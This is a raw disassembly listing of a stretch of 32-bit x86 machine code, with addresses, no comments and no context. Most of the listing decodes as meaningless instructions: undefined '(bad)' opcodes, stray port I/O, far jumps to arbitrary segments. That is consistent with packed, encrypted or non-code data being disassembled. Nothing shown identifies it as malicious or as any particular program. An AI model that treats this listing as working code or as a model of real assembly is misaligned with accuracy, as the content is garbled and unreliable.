  4189e6:	sar    DWORD PTR [edi-0x7e5fb6a9],1
  4189ec:	ficomp WORD PTR [edx-0x243f2690]
  4189f2:	sbb    dl,BYTE PTR [esi+0x33]
  4189f5:	and    BYTE PTR [ecx],dl
  4189f7:	cmp    eax,0x4a4d621c
  4189fc:	out    dx,al
  4189fd:	(bad)  
  4189fe:	int3   
  4189ff:	add    BYTE PTR [eax+0x76],0x32
  418a03:	pusha  
  418a04:	push   ecx
  418a05:	add    dh,dl
  418a07:	scas   eax,DWORD PTR es:[edi]
  418a08:	jmp    0x3ebe:0x5afb0974
  418a0f:	xor    DWORD PTR [edi],ecx
  418a11:	enter  0x1dbc,0x6d
  418a15:	and    DWORD PTR [ebp-0x192e9e3d],eax
  418a1b:	xchg   esp,eax
  418a1c:	arpl   WORD PTR [ecx-0x22],sp
  418a1f:	cli    
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	mov    ecx,0x3980a51a
  418a43:	pop    ds
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	sahf   
  418a4b:	mov    gs,WORD PTR [ebp+0x2c]
  418a4e:	push   edx
  418a4f:	test   al,0xad
  418a51:	pop    edi
  418a52:	cmp    dl,ch
  418a54:	or     cl,BYTE PTR [ebp+0x70]
  418a57:	lods   al,BYTE PTR ds:[esi]
  418a58:	aam    0x7a
  418a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a5b:	div    DWORD PTR [ecx-0xf]
  418a5e:	add    al,0x93
  418a60:	ja     0x4189e5
  418a62:	pop    ss
  418a63:	pop    es
  418a64:	push   cs
  418a65:	push   edx
  418a66:	xchg   esi,eax
  418a67:	(bad)  
  418a68:	xor    eax,edx
  418a6a:	push   esp
  418a6b:	mov    eax,ds:0xbb9ec3d9
  418a70:	dec    esp
  418a71:	dec    ebx
  418a72:	imul   esi,DWORD PTR [edi],0x603edc5c
  418a78:	mov    ecx,0x9ffcd845
  418a7d:	push   ebp
  418a7e:	push   0xd79ac754
  418a83:	adc    eax,0xffb96648
  418a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a89:	or     al,0x25
  418a8b:	ret    0x869
  418a8e:	loope  0x418ac5
  418a90:	jmp    0x418ab9
  418a92:	dec    esi
  418a93:	cld    
  418a94:	xchg   esp,eax
  418a95:	imul   ebx,DWORD PTR [edi+0x4401ea55],0x9f47a8b6
  418a9f:	cmp    al,dh
  418aa1:	inc    edx
  418aa2:	gs push esi
  418aa4:	js     0x418a89
  418aa6:	mov    ds:0x9176091a,eax
  418aab:	add    BYTE PTR [ecx],0xe4
  418aae:	jb     0x418b26
  418ab0:	mov    al,ds:0x89be166f
  418ab5:	cs jecxz 0x418b06
  418ab8:	(bad)  
  418ab9:	aad    0x19
  418abb:	fxch   st(0)
  418abd:	or     al,0xc7
  418abf:	push   ds
  418ac0:	push   es
  418ac1:	nop
  418ac2:	xchg   edi,eax
  418ac3:	leave  
  418ac4:	mov    bh,0x92
  418ac6:	lods   al,BYTE PTR ds:[esi]
  418ac7:	xchg   esp,eax
  418ac8:	outs   dx,BYTE PTR ds:[esi]
  418ac9:	rol    DWORD PTR [edx-0x1afaa1f1],1
  418acf:	aas    
  418ad0:	sbb    BYTE PTR [ecx+0x4ac6406],bh
  418ad6:	mov    esi,0xf3ad14bd
  418adb:	jecxz  0x418a85
  418add:	stos   BYTE PTR es:[edi],al
  418ade:	(bad)  
  418adf:	jmp    0x3d7010e
  418ae4:	ret    0x9f54
  418ae7:	adc    dh,BYTE PTR [eax+0x3f]
  418aea:	push   ss
  418aeb:	xchg   esi,eax
  418aec:	iret   
  418aed:	mov    ebx,0x51aa8fe8
  418af2:	imul   esp,ebp,0x28a5686f
  418af8:	hlt    
  418af9:	cmp    eax,0x5bfb537b
  418afe:	cmp    ebp,DWORD PTR [esi+0x7c8da0f0]
  418b04:	ret    
  418b05:	stos   DWORD PTR es:[edi],eax
  418b06:	push   0x76
  418b08:	aas    
  418b09:	xchg   esi,eax
  418b0a:	jl     0x418b7c
  418b0c:	minps  xmm3,XMMWORD PTR [eax-0x49]
  418b10:	dec    esi
  418b11:	sub    edi,edx
  418b13:	inc    ebx
  418b14:	cdq    
  418b15:	add    ah,BYTE PTR [ecx+0x33a68dc]
  418b1b:	pop    ax
  418b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b1e:	sbb    eax,0xec0f58ac
  418b23:	mov    ebp,0x1eefb934
  418b28:	sahf   
  418b29:	daa    
  418b2a:	pop    esp
  418b2b:	jno    0x418ab5
  418b2d:	cld    
  418b2e:	push   0x4b
  418b30:	popa   
  418b31:	int    0x73
  418b33:	sub    BYTE PTR [edx-0x75],al
  418b36:	push   edx
  418b37:	xor    al,0x61
  418b39:	push   ebx
  418b3a:	pop    eax
  418b3b:	mov    esp,0x5b4241a3
  418b40:	xchg   ebx,eax
  418b41:	fnsetpm(287 only) 
  418b43:	jno    0x418b81
  418b45:	test   BYTE PTR [eax-0x6d71c132],ah
  418b4b:	(bad)  
  418b4d:	aam    0x30
  418b4f:	retf   0x7e49
  418b52:	fnstsw WORD PTR [ecx-0x78]
  418b55:	mov    ds:0x3e599a95,al
  418b5a:	pop    eax
  418b5b:	and    al,0xe7
  418b5d:	dec    edi
  418b5e:	xchg   edx,eax
  418b5f:	mov    ah,0x29
  418b61:	xchg   cl,bh
  418b63:	lea    eax,[eax+0x51f94b4d]
  418b69:	xchg   ebx,eax
  418b6a:	dec    esi
  418b6b:	out    dx,al
  418b6c:	cdq    
  418b6d:	and    ah,BYTE PTR [ecx]
  418b6f:	xchg   edi,eax
  418b70:	sub    cl,bl
  418b72:	inc    esi
  418b73:	push   ebp
  418b74:	ret    0xefc0
  418b77:	aas    
  418b78:	ficom  DWORD PTR [esi]
  418b7a:	gs push esp
  418b7c:	or     dl,BYTE PTR [eax]
  418b7e:	jo     0x418b1c
  418b80:	test   al,0x49
  418b82:	mov    bl,0xf9
  418b84:	scas   eax,DWORD PTR es:[edi]
  418b85:	pop    esi
  418b86:	pushf  
  418b87:	hlt    
  418b88:	inc    eax
  418b89:	adc    BYTE PTR [esi+0x7c],al
  418b8c:	jno    0x418b9f
  418b8e:	cs pop ecx
  418b90:	inc    ebx
  418b91:	push   ebx
  418b92:	pop    ds
  418b93:	xor    al,0x7e
  418b95:	dec    eax
  418b96:	stos   DWORD PTR es:[edi],eax
  418b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b98:	xchg   edx,eax
  418b99:	ins    DWORD PTR es:[edi],dx
  418b9a:	mov    cl,0x10
  418b9c:	(bad)
  418b9f:	fsubr  QWORD PTR [ecx-0x64]
  418ba2:	ins    DWORD PTR es:[edi],dx
  418ba3:	ins    BYTE PTR es:[edi],dx
  418ba4:	out    0xe8,al
  418ba6:	cmp    al,0xf6
  418ba8:	jmp    0x418bc7
  418baa:	cs inc ecx
  418bac:	sbb    ecx,DWORD PTR [ebx-0x7dc0c23f]
  418bb2:	dec    edx
  418bb3:	inc    ebp
  418bb4:	fwait
  418bb5:	in     eax,dx
  418bb6:	into   
  418bb7:	and    DWORD PTR [ebx+0x62],0x3
  418bbb:	mov    edx,0x3a4d36a8
  418bc0:	pop    ebp
  418bc1:	ficom  WORD PTR [eax+ebx*8]
  418bc4:	je     0x418bf7
  418bc6:	mov    ss,WORD PTR [eax+ebx*2+0x713f64b5]
  418bcd:	jno    0x418c30
  418bcf:	inc    ecx
  418bd0:	sub    dl,ch
  418bd2:	xor    DWORD PTR [esi-0x41973d9f],esp
  418bd8:	xchg   ecx,eax
  418bd9:	or     dl,BYTE PTR [esi]
  418bdb:	imul   eax,DWORD PTR [edx+0x4be325d7],0xa72085be
  418be5:	mov    eax,0x807d4706
  418bea:	xor    ecx,DWORD PTR [ebx-0x789be4a8]
  418bf0:	mov    esp,0xd67856d8
  418bf5:	pop    ss
  418bf6:	add    DWORD PTR [ecx+0x52],ebx
  418bf9:	xchg   ecx,eax
  418bfa:	or     DWORD PTR [ebx],esp
  418bfc:	les    ebp,FWORD PTR [esi+0x5b]
  418bff:	test   BYTE PTR fs:[edi+0x74],bl
  418c03:	mov    WORD PTR [ebx+0x1b],ss
  418c06:	mov    eax,ds:0x9c4a96af
  418c0b:	xor    al,BYTE PTR [eax+0x4e]
  418c0e:	dec    eax
  418c0f:	push   es
  418c10:	aam    0x80
  418c12:	lock cli 
  418c14:	rol    esp,0x8b
  418c17:	bound  esi,QWORD PTR [ebx+edx*2+0x8]
  418c1b:	aaa    
  418c1c:	jne    0x418bd5
  418c1e:	imul   esp
  418c20:	xor    DWORD PTR [eax+0xa],0x1b
  418c24:	in     eax,0x6
  418c26:	inc    ebx
  418c27:	mov    edi,0x63d1fe6e
  418c2c:	loope  0x418c4b
  418c2e:	shr    ebx,1
  418c30:	aas    
  418c31:	adc    BYTE PTR [ecx+0x17f01e0e],0xba
  418c38:	cmp    BYTE PTR [esi+0x60acf571],dh
  418c3e:	inc    ebp
  418c3f:	adc    al,0x46
  418c41:	je     0x418c78
  418c43:	pcmpgtb mm7,QWORD PTR ds:0x15c7ce05
  418c4a:	push   esp
  418c4b:	add    esi,ebp
  418c4d:	das    
  418c4e:	mov    ah,0x84
  418c50:	js     0x418c78
  418c52:	sti    
  418c53:	jo     0x418c1f
  418c55:	add    cl,BYTE PTR [ebx+0x7c]
  418c58:	ja     0x418c06
  418c5a:	ret    
  418c5b:	mov    ds:0x3130f56,al
  418c60:	adc    eax,0xd11bfdfc
  418c65:	cmp    eax,DWORD PTR [edi+0x7e]
  418c68:	imul   ebp,DWORD PTR [esi+eiz*8],0x92a6f9db
  418c6f:	mov    edi,0x16b1515d
  418c74:	or     eax,DWORD PTR [ecx+0x57bc0080]
  418c7a:	inc    esp
  418c7b:	out    0x2f,eax
  418c7d:	div    BYTE PTR [edi+0x27d362aa]
  418c83:	jb     0x418cc3
  418c85:	push   ss
  418c86:	aad    0xca
  418c88:	inc    esi
  418c89:	and    eax,0x8ba67765
  418c8e:	push   ebx
  418c8f:	test   DWORD PTR ds:0xc9545cbe,edx
  418c95:	mov    WORD PTR [ebp-0x40],gs
  418c98:	mov    ds:0xa336fff1,al
  418c9d:	inc    ecx
  418c9e:	das    
  418c9f:	int3   
  418ca0:	int    0x4
  418ca2:	xchg   BYTE PTR [ebx+ebp*4],cl
  418ca5:	pop    es
  418ca6:	mov    esi,0xa1739eb
  418cab:	leave  
  418cac:	mov    edi,0xdf47f25b
  418cb1:	push   edi
  418cb2:	hlt    
  418cb3:	sub    BYTE PTR [ecx-0x1],ah
  418cb6:	sbb    eax,0x901dd1b
  418cbb:	adc    BYTE PTR [esp+ebx*8],cl
  418cbe:	aad    0x35
  418cc0:	mov    DWORD PTR [ebx],ecx
  418cc2:	add    ecx,esi
  418cc4:	mov    eax,ds:0x29bbc48b
  418cc9:	aam    0x84
  418ccb:	ret    0x8a7f
  418cce:	in     al,0x87
  418cd0:	cld    
  418cd1:	xchg   esp,eax
  418cd2:	pop    edx
  418cd3:	mov    ebx,0x8c29691c
  418cd8:	or     dl,BYTE PTR [ebx]
  418cda:	adc    al,0xe1
  418cdc:	das    
  418cdd:	pop    ebx
  418cde:	mov    edi,0x5a0d47c4
  418ce3:	ret    0x91e4
  418ce6:	rol    BYTE PTR [ecx+0x553a87f1],cl
  418cec:	inc    edi
  418ced:	jmp    0x810e:0xc1ae2101
  418cf4:	leave  
  418cf5:	mov    ebp,0xbe6f2c05
  418cfa:	outs   dx,BYTE PTR ds:[esi]
  418cfb:	popa   
  418cfc:	popa   
  418cfd:	or     DWORD PTR [edx+0x4b],edx
  418d00:	je     0x418d5d
  418d02:	sbb    DWORD PTR [ecx-0x4552990],0x446cad54
  418d0c:	lahf   
  418d0d:	in     eax,dx
  418d0e:	(bad)  
  418d0f:	jg     0x418cb9
  418d11:	push   0xffffff96
  418d13:	mov    eax,ds:0x87b21758
  418d18:	cmp    eax,0x63c33e57
  418d1d:	add    DWORD PTR [edi],edx
  418d1f:	push   ds
  418d20:	cmp    esi,esi
  418d22:	inc    esi
  418d23:	(bad)  
  418d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d25:	std    
  418d26:	xchg   BYTE PTR [esi-0x2e14b5e3],dl
  418d2c:	xor    al,0xd3
  418d2e:	rcl    BYTE PTR [edi+eax*2-0xb],1
  418d32:	mov    edi,0xf41c5559
  418d37:	pop    ecx
  418d38:	in     al,0xe5
  418d3a:	mov    ecx,0xd499a3e8
  418d3f:	sti    
  418d40:	jle    0x418d4a
  418d42:	mov    eax,0x75b9eb4a
  418d47:	pop    eax
  418d48:	pop    ecx
  418d49:	mov    ebx,0xb5d05381
  418d4e:	xchg   BYTE PTR ds:0xdd0944bb,ch
  418d54:	mov    eax,ds:0x86b540af
  418d59:	adc    DWORD PTR [ebp+ebp*2+0x8c1e04b],ebp
  418d60:	mov    edx,0x8392c04c
  418d65:	add    al,0xee
  418d67:	sub    esp,0xa9cc6d58
  418d6d:	jne    0x418cf6
  418d6f:	ins    BYTE PTR es:[edi],dx
  418d70:	mov    ebp,0xa2def939
  418d75:	or     al,0xd6
  418d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d78:	adc    DWORD PTR [ebx],esp
  418d7a:	jmp    0x418dee
  418d7c:	std    
  418d7d:	test   BYTE PTR [eax+ebp*2],dl
  418d80:	shl    BYTE PTR [ebx+0x6e],cl
  418d83:	mov    ch,BYTE PTR [ebx+0x4f]
  418d86:	pop    ss
  418d87:	aad    0xe1
  418d89:	or     bh,BYTE PTR [edi+0x61]
  418d8c:	push   esi
  418d8d:	sbb    BYTE PTR [eax],bl
  418d8f:	ret    
  418d90:	(bad)  
  418d91:	xchg   ebp,eax
  418d92:	clc    
  418d93:	or     al,0xd2
  418d95:	xor    esp,edi
  418d97:	cmp    al,0x8d
  418d9a:	mov    bh,0xc7
  418d9c:	xor    esp,DWORD PTR [eax]
  418d9e:	arpl   WORD PTR [edi-0x19417c4f],si
  418da4:	loopne 0x418d9a
  418da6:	cmp    al,0x1a
  418da8:	clc    
  418da9:	(bad)
  418dad:	pusha  
  418dae:	mov    edi,0x243f2ae5
  418db3:	push   edi
  418db4:	pop    eax
  418db5:	dec    esi
  418db6:	cmp    ebx,esp
  418db8:	idiv   DWORD PTR [edx]
  418dba:	cmp    bl,cl
  418dbc:	or     dh,BYTE PTR [edi]
  418dbe:	add    DWORD PTR [edi],edi
  418dc0:	and    al,0xa1
  418dc2:	stos   DWORD PTR es:[edi],eax
  418dc3:	iret   
  418dc4:	shl    al,cl
  418dc6:	cmc    
  418dc7:	mov    ebx,0x45536e8d
  418dcc:	out    dx,eax
  418dcd:	mov    ds:0x3796abb9,al
  418dd2:	push   esi
  418dd3:	mov    bh,0x53
  418dd5:	ds repnz mov dl,0x27
  418dd9:	sub    DWORD PTR [ebx],edi
  418ddb:	xor    eax,0x3a74c16c
  418de0:	inc    ebx
  418de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de2:	pop    esi
  418de3:	or     DWORD PTR [esi+0x2cd2cbe6],edi
  418de9:	mov    ch,0x33
  418deb:	xchg   ecx,eax
  418dec:	jecxz  0x418dfe
  418dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418def:	xor    bh,cl
  418df1:	es in  eax,dx
  418df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418df4:	adc    eax,0x916f752b
  418df9:	aas    
  418dfa:	dec    ebp
  418dfb:	mov    ds:0x9abf7b5a,eax
  418e00:	imul   ebp,DWORD PTR ds:0x4e20f5aa,0x22
  418e07:	lods   eax,DWORD PTR ds:[esi]
  418e08:	sahf   
  418e09:	and    eax,0x641950cc
  418e0e:	mov    esi,0x1ff4c6
  418e13:	sahf   
  418e14:	push   ebx
  418e15:	push   ds
  418e16:	pop    edx
  418e17:	inc    ebx
  418e18:	pop    edx
  418e19:	push   ebp
  418e1a:	js     0x418e2e
  418e1c:	add    BYTE PTR [ebx-0x42d5f08d],bh
  418e22:	out    0x4b,eax
  418e24:	dec    esi
  418e25:	jg     0x418e8b
  418e27:	fdivr  st,st(2)
  418e29:	call   0x8b0158b2
  418e2e:	pushf  
  418e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e30:	stos   DWORD PTR es:[edi],eax
  418e31:	pop    esi
  418e32:	mov    eax,0x8a259962
  418e37:	lods   eax,DWORD PTR ds:[esi]
  418e38:	mov    dl,0x6f
  418e3a:	loope  0x418e9d
  418e3c:	cld    
  418e3d:	cld    
  418e3e:	push   cs
  418e3f:	add    DWORD PTR ds:0x9e5a533f,0x2284f6e3
  418e49:	pop    ebx
  418e4a:	cli    
  418e4b:	inc    BYTE PTR [esi+0x73a89ccf]
  418e51:	push   edi
  418e52:	push   ss
  418e53:	outs   dx,BYTE PTR ds:[esi]
  418e54:	pop    eax
  418e55:	(bad)  [esi]
  418e57:	rcl    BYTE PTR [edi-0x78],1
  418e5a:	fidivr DWORD PTR [ebx]
  418e5c:	mov    cl,bh
  418e5e:	jg     0x418e8e
  418e60:	cmc    
  418e61:	or     BYTE PTR [ecx+0x6b],bl
  418e64:	jne    0x418dea
  418e66:	out    0xb2,eax
  418e68:	cld    
  418e69:	or     esi,DWORD PTR [ebp-0xfe001ba]
  418e6f:	xor    ebp,DWORD PTR ds:0x8a02e977
  418e75:	dec    bp
  418e77:	cmp    al,0xe6
  418e79:	cld    
  418e7a:	pusha  
  418e7b:	sbb    BYTE PTR [edi],bl
  418e7d:	jge    0x418e6b
  418e7f:	mov    eax,ds:0x13dff117
  418e84:	ins    DWORD PTR es:[edi],dx
  418e85:	inc    esp
  418e86:	cmp    ebx,ecx
  418e88:	push   edi
  418e89:	push   edi
  418e8a:	fbld   TBYTE PTR [eax-0x606ea63b]
  418e90:	inc    esp
  418e91:	add    eax,0x344a61e2
  418e96:	(bad)  
  418e97:	adc    ebp,DWORD PTR [ebp-0xf]
  418e9a:	sbb    DWORD PTR [ebx+eiz*8],0xffffffb3
  418e9e:	cmp    al,0x38
  418ea0:	pop    ds
  418ea1:	jecxz  0x418e50
  418ea3:	rcr    BYTE PTR [ebp-0x26e0fa12],1
  418ea9:	push   ss
  418eaa:	jg     0x418ea3
  418eac:	sub    bh,ah
  418eae:	mov    es,WORD PTR [eax+0x710f8081]
  418eb4:	pushf  
  418eb5:	fwait
  418eb6:	daa    
  418eb7:	push   ss
  418eb8:	mov    ?,WORD PTR [ebp-0x3d]
  418ebb:	xchg   ecx,eax
  418ebc:	mov    edi,0xb0d7c64a
  418ec1:	pop    eax
  418ec2:	mov    DWORD PTR [eax+0x7a6a19c],ecx
  418ec8:	lods   al,BYTE PTR ds:[esi]
  418ec9:	jecxz  0x418e80
  418ecb:	pop    esp
  418ecc:	push   es
  418ecd:	inc    edx
  418ece:	aad    0x7f
  418ed0:	(bad)  
  418ed1:	and    ecx,esp
  418ed3:	dec    esp
  418ed4:	or     ebx,DWORD PTR [ecx+0x771f4302]
  418eda:	xchg   ebp,eax
  418edb:	lods   al,BYTE PTR ds:[esi]
  418edc:	xchg   esp,eax
  418edd:	fcmovnb st,st(3)
  418edf:	inc    edx
  418ee0:	mov    esi,DWORD PTR [eax+0x13597541]
  418ee6:	and    eax,DWORD PTR [ebp+ebp*2-0x423ce3ef]
  418eed:	cld    
  418eee:	mov    ah,0x34
  418ef0:	aam    0x36
  418ef2:	les    esp,FWORD PTR [ebx-0x56]
  418ef5:	sub    BYTE PTR [ebp-0xc],dh
  418ef8:	stc    
  418ef9:	mov    cl,0x7e
  418efb:	lock xchg esi,eax
  418efd:	cmp    eax,0xe8f7364c
  418f02:	mov    eax,ds:0x735a4fcc
  418f07:	retf   
  418f08:	mov    dl,0x6a
  418f0a:	pop    ecx
  418f0b:	lods   eax,DWORD PTR ds:[esi]
  418f0c:	mov    edx,0x2866a936
  418f11:	inc    edi
  418f12:	or     al,0x94
  418f14:	std    
  418f15:	cmp    esi,edi
  418f17:	or     DWORD PTR [edi-0x28],0xffffffeb
  418f1b:	push   edi
  418f1c:	push   ss
  418f1d:	jmp    0x4cc87e2b
  418f22:	add    bh,0x2d
  418f25:	mov    DWORD PTR [ecx+0x31],0x302b04ae
  418f2c:	jecxz  0x418ec0
  418f2e:	jg     0x418f0a
  418f30:	ret    0xa592
  418f33:	rcl    DWORD PTR [edx],1
  418f35:	cmp    BYTE PTR [ebx],ch
  418f37:	je     0x418ef2
  418f39:	xchg   esi,eax
  418f3a:	(bad)  
  418f3b:	rol    BYTE PTR [ebx+0xaca3baa],1
  418f41:	and    ch,dh
  418f43:	lds    ebx,FWORD PTR [edx]
  418f45:	or     BYTE PTR [ebx],bh
  418f47:	dec    edi
  418f48:	nop
  418f49:	fisubr WORD PTR [esi+0x21]
  418f4c:	or     BYTE PTR [ecx-0x66],bh
  418f4f:	jle    0x418f5a
  418f51:	and    eax,0xa349f53d
  418f56:	into   
  418f57:	inc    ebx
  418f58:	hlt    
  418f59:	in     eax,dx
  418f5a:	dec    esi
  418f5b:	repz jne 0x418f4a
  418f5e:	nop
  418f5f:	push   eax
  418f60:	jb     0x418f5d
  418f62:	jnp    0x418f04
  418f64:	inc    ebp
  418f65:	sub    ecx,ebp
  418f67:	imul   edx,ecx,0x597a176a
  418f6d:	xchg   ecx,eax
  418f6e:	cdq    
  418f6f:	scas   al,BYTE PTR es:[edi]
  418f70:	ret    
  418f71:	mov    dl,0x23
  418f73:	test   dh,al
  418f75:	je     0x418f61
  418f77:	push   cs
  418f78:	arpl   di,cx
  418f7a:	push   esp
  418f7b:	push   ss
  418f7c:	inc    ebx
  418f7d:	shl    ebp,1
  418f7f:	leave  
  418f80:	or     DWORD PTR [esi+0x5a71d73f],ecx
  418f86:	mov    ecx,0xff588853
  418f8b:	or     bh,BYTE PTR [ebx]
  418f8d:	in     eax,0x8e
  418f8f:	lods   al,BYTE PTR ds:[esi]
  418f90:	xchg   DWORD PTR [edx+0x62d88537],edi
  418f96:	or     BYTE PTR [eax],cl
  418f98:	and    eax,0x83c133a9
  418f9d:	lock loope 0x41901e
  418fa0:	shr    BYTE PTR [eax+0x5ab6cb82],0x90
  418fa7:	fnsave [ebp-0x52]
  418faa:	fst    DWORD PTR [eax-0x64]
  418fad:	dec    esi
  418fae:	fimul  DWORD PTR [esi-0x5531ea7f]
  418fb4:	imul   edi,DWORD PTR [eax-0x1f],0xbd15113
  418fbb:	adc    BYTE PTR [edi+0x14c2b2fc],0x73
  418fc2:	cmp    ah,BYTE PTR ds:0xbdef3ab
  418fc8:	pop    ebx
  418fc9:	xchg   DWORD PTR [edi-0x1c55fe0b],ecx
  418fcf:	sub    eax,0xe4744f15
  418fd4:	xlat   BYTE PTR ds:[ebx]
  418fd5:	jecxz  0x418f73
  418fd7:	popf   
  418fd8:	push   ebx
  418fd9:	js     0x419009
  418fdb:	fwait
  418fdc:	add    DWORD PTR [edi-0x41271213],ebx
  418fe2:	repz mov ebx,0x64af30d8
  418fe8:	cmp    esi,DWORD PTR [ecx]
  418fea:	adc    eax,0xf92747de
  418fef:	test   al,0x85
  418ff1:	shl    bl,0x9f
  418ff4:	mov    DWORD PTR [edi-0x66edde68],ebx
  418ffa:	xor    DWORD PTR [edi+0x72],0x8014179e
  419001:	loop   0x418fb6
  419003:	inc    esi
  419004:	pop    esp
  419005:	jmp    0x419033
  419007:	lods   al,BYTE PTR ds:[esi]
  419008:	pop    edx
  419009:	sub    DWORD PTR [eax-0x11],eax
  41900c:	fmul   st(7),st
  41900e:	or     eax,DWORD PTR [edx]
  419010:	xchg   ebp,eax
  419011:	add    eax,ecx
  419013:	mov    ebp,0xc25d1f3e
  419018:	xchg   ebp,eax
  419019:	jbe    0x419047
  41901b:	mov    bl,0x0
  41901d:	push   0x72
  41901f:	imul   edx,edi,0xffffffcd
  419022:	mov    ecx,DWORD PTR [ecx]
  419024:	cmp    dl,cl
  419026:	fdiv   st,st(0)
  419028:	cmp    BYTE PTR [eax],bh
  41902a:	call   0x1e9b8032
  41902f:	mov    eax,ds:0xe59e46c8
  419034:	xor    eax,DWORD PTR [ecx+edx*8-0x63]
  419038:	xor    ecx,DWORD PTR [edi]
  41903a:	and    al,0x27
  41903c:	pop    ds
  41903d:	jl     0x41909f
  41903f:	xchg   ebx,eax
  419040:	arpl   WORD PTR [eax+0x1ae4287f],dx
  419046:	or     eax,0x41bcf888
  41904b:	jnp    0x418fee
  41904d:	or     ch,0xd7
  419050:	in     eax,dx
  419051:	test   al,0x69
  419053:	mov    ecx,0x484b8fde
  419058:	add    BYTE PTR [ecx+0x473cc826],cl
  41905e:	(bad)  
  419060:	mov    eax,0x4fcf4bdf
  419065:	jg     0x419096
  419067:	xchg   ecx,eax
  419068:	push   esi
  419069:	dec    ecx
  41906a:	cmc    
  41906b:	int    0xc4
  41906d:	inc    edi
  41906e:	mov    DWORD PTR [ecx-0x30a93f0c],0x5aace815
  419078:	(bad)  
  419079:	stc    
  41907a:	xchg   BYTE PTR [edx+0x15],bh
  41907d:	add    dh,BYTE PTR [ebp+0x51b0ad36]
  419083:	bound  esi,QWORD PTR [eax+0x36]
  419086:	pop    esp
  419087:	sub    al,BYTE PTR [esi+ebx*8]
  41908a:	je     0x4190d1
  41908c:	mov    al,0x17
  41908e:	mov    edi,0x60ea1a89
  419093:	xor    eax,0xbd6a4425
  419098:	rcl    BYTE PTR [eax],cl
  41909a:	inc    edi
  41909b:	pop    ebx
  41909c:	push   ss
  41909d:	push   ds
  41909e:	jge    0x41904d
  4190a0:	test   BYTE PTR [ebp+0x69ffbc97],al
  4190a6:	adc    eax,0xde867ee4
  4190ab:	aad    0x5
  4190ad:	push   edx
  4190ae:	icebp  
  4190af:	shl    esi,1
  4190b1:	cmp    edi,esp
  4190b3:	lahf   
  4190b4:	hlt    
  4190b5:	fidivr WORD PTR [edx-0x38c4a95]
  4190bb:	lahf   
  4190bc:	dec    edi
  4190bd:	sbb    edx,DWORD PTR [esi]
  4190bf:	push   edi
  4190c0:	or     al,0x56
  4190c2:	aas    
  4190c3:	sahf   
  4190c4:	sbb    eax,0x9c5223b8
  4190c9:	or     eax,0x97ca8ab3
  4190ce:	repz or edi,esp
  4190d1:	pusha  
  4190d2:	push   edx
  4190d3:	xor    bh,BYTE PTR [edx]
  4190d5:	stc    
  4190d6:	repnz mov dh,0x89
  4190d9:	cmp    ch,BYTE PTR [ebp-0x251180fe]
  4190df:	or     edx,esi
  4190e1:	sub    DWORD PTR fs:[edi+0x55bef25b],0x66508961
  4190ec:	push   es
  4190ed:	or     ecx,DWORD PTR [esi+0x17]
  4190f0:	jno    0x4190cb
  4190f2:	shr    esp,cl
  4190f4:	rol    bl,cl
  4190f6:	addr16 jno 0x4190b1
  4190f9:	js     0x419116
  4190fb:	popf   
  4190fc:	iret   
  4190fd:	rcr    DWORD PTR [edx+ecx*4-0x6969a140],1
  419104:	adc    esi,esi
  419106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419107:	loope  0x41912f
  419109:	jo     0x41917f
  41910b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41910c:	mul    DWORD PTR [ebp+0x4ffab758]
  419112:	inc    ebx
  419113:	inc    BYTE PTR [ebp+0x22af5e6a]
  419119:	fidiv  WORD PTR [edi]
  41911b:	push   esp
  41911c:	mov    ah,0xcf
  41911e:	and    al,0x47
  419120:	sbb    eax,0xf5918f9c
  419125:	shl    BYTE PTR [eax],1
  419127:	push   edi
  419128:	or     edx,DWORD PTR [edi+0x500555a3]
  41912e:	add    dl,BYTE PTR [esi]
  419130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419131:	inc    ebp
  419132:	frstor [edx+0x10e0a786]
  419138:	and    esi,eax
  41913a:	and    ecx,DWORD PTR [ebp+edi*4-0x5c]
  41913e:	adc    al,0xf4
  419140:	fild   QWORD PTR [ecx]
  419142:	sbb    DWORD PTR [eax-0x1b],ecx
  419145:	stos   BYTE PTR es:[edi],al
  419146:	add    DWORD PTR [esi+0x6c7fa3e0],esi
  41914c:	gs ins DWORD PTR es:[edi],dx
  41914e:	repnz mov DWORD PTR [eax],esp
  419151:	jle    0x41919f
  419153:	or     eax,0x6668f5a5
  419158:	xor    BYTE PTR [edx+0x7d71128b],al
  41915e:	mov    eax,0x23c44130
  419163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419164:	ds push ds
  419166:	pop    es
  419167:	sub    eax,0x1dbc5dbb
  41916c:	mov    bl,0x74
  41916e:	jne    0x419106
  419170:	rol    BYTE PTR [edx-0x16],0x5
  419174:	or     DWORD PTR [ebx+0x58],ebp
  419177:	cmp    eax,0x4fe0c02f
  41917c:	jge    0x419139
  41917e:	mov    esp,0xdeae744b
  419183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419184:	inc    ebx
  419185:	xor    BYTE PTR [edx-0x53],dh
  419188:	xchg   esp,eax
  419189:	push   ds
  41918a:	dec    eax
  41918b:	(bad)  
  41918c:	es push ebp
  41918e:	lahf   
  41918f:	dec    esp
  419190:	bound  ebp,QWORD PTR ds:0x887c6538
  419196:	adc    eax,0xa09175e8
  41919b:	push   eax
  41919c:	push   ebp
  41919d:	and    BYTE PTR [esi],bl
  41919f:	frstor [edx]
  4191a1:	les    edi,FWORD PTR [edi+0x57]
